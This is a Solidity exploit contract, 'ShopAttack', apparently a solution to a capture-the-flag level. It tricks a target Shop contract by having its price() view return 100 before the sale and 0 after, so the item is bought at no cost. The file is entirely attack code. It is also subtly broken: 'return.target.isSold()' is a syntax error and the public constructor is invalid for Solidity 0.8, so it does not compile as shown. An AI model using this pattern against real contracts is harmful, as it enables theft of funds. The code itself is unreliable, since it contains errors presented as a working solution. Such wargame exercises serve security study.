// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ShopAttack is Buyer {
    Shop public target;

    constructor(Shop _target) public {
        target = _target;
    }

    function buy() public {
        target.buy();
    }

    function price() public view override returns (uint256) {
        return.target.isSold() ? 0 : 100;
    }
}
